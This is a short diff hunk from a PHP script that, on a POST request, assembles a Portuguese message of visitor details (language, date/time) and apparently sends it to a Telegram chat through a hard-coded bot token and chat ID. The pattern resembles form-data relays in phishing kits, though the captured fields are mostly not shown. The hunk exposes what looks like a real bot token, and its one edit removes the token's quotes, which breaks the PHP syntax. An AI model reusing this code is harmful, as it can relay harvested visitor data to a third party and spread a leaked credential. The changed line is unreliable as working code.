@@ -54,7 +54,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $conteudo .= "👥 | LINGUAGEM: $linguao\n";
         $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        
 
-        $botToken = '7916266742:AAGg1HaOLst8wMyTSptCJolr4-wSyoLgdmE';
+        $botToken = 7916266742:AAGg1HaOLst8wMyTSptCJolr4-wSyoLgdmE;
         $chatId = '-2424448597';
 
         $mensagem = urlencode($conteudo);
